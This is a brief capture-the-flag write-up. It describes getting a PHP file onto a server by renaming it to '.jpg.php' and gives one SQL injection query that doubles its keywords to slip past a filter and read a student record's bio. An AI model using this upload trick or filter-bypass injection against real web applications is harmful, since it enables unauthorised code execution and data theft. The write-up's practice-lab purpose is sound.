For the remote file inclusion i had to upload a malicious file in form of a image.
All i did was change the image extension from jpg to jpg.php so now i could write some php code into it.
Once the malicious file was uploaded i got the confirmation that RFI was planted then skimming through agent RFI's bio got me the flag.

Query to get the flag: ' oorr '1' = '1' uniunionon selselectect 1,bio,3,4,5,6,7,8,9,10,11,12,13,14 from student whewherere name='Agent RFI' #
